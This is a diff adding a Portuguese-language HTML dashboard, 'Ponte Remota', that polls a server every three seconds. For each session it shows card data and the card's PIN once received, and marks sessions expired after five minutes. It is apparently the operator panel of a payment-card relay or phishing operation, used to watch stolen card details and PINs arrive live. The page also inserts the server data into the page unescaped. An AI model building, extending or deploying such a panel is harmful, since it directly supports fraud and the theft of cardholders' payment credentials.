@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ponte Remota - Dashboard de Monitoramento</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #1e1e1e;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            color: #BB86FC;
+            border-bottom: 2px solid #3700B3;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .session-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        .session-card {
+            background-color: #2c2c2c;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 5px solid #03DAC6;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .session-card h3 {
+            margin-top: 0;
+            color: #03DAC6;
+        }
+        .session-card p {
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+        .status-tag {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.8em;
+            margin-top: 10px;
+        }
+        .status-tag.pending {
+            background-color: #FFC107;
+            color: #000;
+        }
+        .status-tag.received {
+            background-color: #4CAF50;
+            color: #fff;
+        }
+        .status-tag.expired {
+            background-color: #F44336;
+            color: #fff;
+        }
+        .pin-display {
+            font-size: 1.2em;
+            color: #BB86FC;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Dashboard de Monitoramento (V10)</h1>
+        <p>Atualização automática a cada 3 segundos.</p>
+        <div id="session-list" class="session-list">
+            <!-- Sessões serão injetadas aqui -->
+        </div>
+    </div>
+
+    <script>
+        function fetchSessions() {
+            fetch('/api/sessions')
+                .then(response => response.json())
+                .then(sessions => {
+                    const listContainer = document.getElementById('session-list');
+                    listContainer.innerHTML = ''; // Limpa a lista
+
+                    for (const sessionId in sessions) {
+                        const session = sessions[sessionId];
+                        const card = document.createElement('div');
+                        card.className = 'session-card';
+
+                        let statusClass = 'pending';
+                        if (session.pin) {
+                            statusClass = 'received';
+                        } else if (new Date() - new Date(session.timestamp) > 300000) { // 5 minutos
+                            statusClass = 'expired';
+                        }
+
+                        card.innerHTML = `
+                            <h3>Sessão: ${sessionId}</h3>
+                            <p><strong>Cartão:</strong> ${session.cardData}</p>
+                            <p><strong>Início:</strong> ${new Date(session.timestamp).toLocaleTimeString()}</p>
+                            <div class="pin-display">PIN: ${session.pin ? session.pin : 'Aguardando...'}</div>
+                            <span class="status-tag ${statusClass}">${session.status}</span>
+                        `;
+                        listContainer.appendChild(card);
+                    }
+                })
+                .catch(error => console.error('Erro ao buscar sessões:', error));
+        }
+
+        // Atualiza a cada 3 segundos
+        setInterval(fetchSessions, 3000);
+        fetchSessions(); // Busca inicial
+    </script>
+</body>
+</html>
